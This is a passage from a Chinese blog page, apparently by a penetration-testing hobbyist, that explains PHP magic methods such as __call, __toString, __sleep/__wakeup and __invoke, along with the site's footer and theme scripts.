<h3 id="3、-call"><a href="#3、-call" class="headerlink" title="3、__call"></a>3、__call</h3><p>__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法</p>
<h3 id="4、-autoload"><a href="#4、-autoload" class="headerlink" title="4、__autoload"></a>4、__autoload</h3><p>__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</p>
<p>注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。</p>
<h3 id="5、construct、destruct"><a href="#5、construct、destruct" class="headerlink" title="5、construct、destruct"></a>5、<strong>construct、</strong>destruct</h3><p>construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称<br>destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法<br>默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.，在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。</p>
<h3 id="6、-clone"><a href="#6、-clone" class="headerlink" title="6、__clone"></a>6、__clone</h3><p>PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在clone方法实现。</p>
<h3 id="7、-toString"><a href="#7、-toString" class="headerlink" title="7、__toString"></a>7、__toString</h3><p>__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。</p>
<p>在PHP 5.2.0之前，toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）。从PHP 5.2.0，如果将一个未定义toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。</p>
<h3 id="8、sleep、wakeup"><a href="#8、sleep、wakeup" class="headerlink" title="8、sleep、wakeup"></a>8、<strong>sleep、</strong>wakeup</h3><p>sleep 串行化的时候用<br>wakeup 反串行化的时候调用<br>serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。</p>
<p>使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。</p>
<p>相反地，unserialize() 检查具有魔术名称 wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</p>
<h3 id="9、-set-state"><a href="#9、-set-state" class="headerlink" title="9、__set_state"></a>9、__set_state</h3><p>当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =&gt; value, …)格式排列的类属性。</p>
<h3 id="10、-invoke"><a href="#10、-invoke" class="headerlink" title="10、__invoke"></a>10、__invoke</h3><p>当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效</p>
<h3 id="11、-callStatic"><a href="#11、-callStatic" class="headerlink" title="11、__callStatic"></a>11、__callStatic</h3><p>它的工作方式类似于 call() 魔术方法，callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。同样，call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">VegyChick</p>
              <div class="site-description motion-element" itemprop="description">沉迷渗透测试的信安菜鸟</div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">25</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              

              
            </nav>
          

          

          

          

          

          
          

          
            
          
          

        </div>
      </div>

      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">VegyChick</span>

  

  
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.2.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.2.0"></script>

  <script src="/js/motion.js?v=7.2.0"></script>



  
  


  <script src="/js/schemes/muse.js?v=7.2.0"></script>



  

  


  <script src="/js/next-boot.js?v=7.2.0"></script>


  

  

  

  



  




  

  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
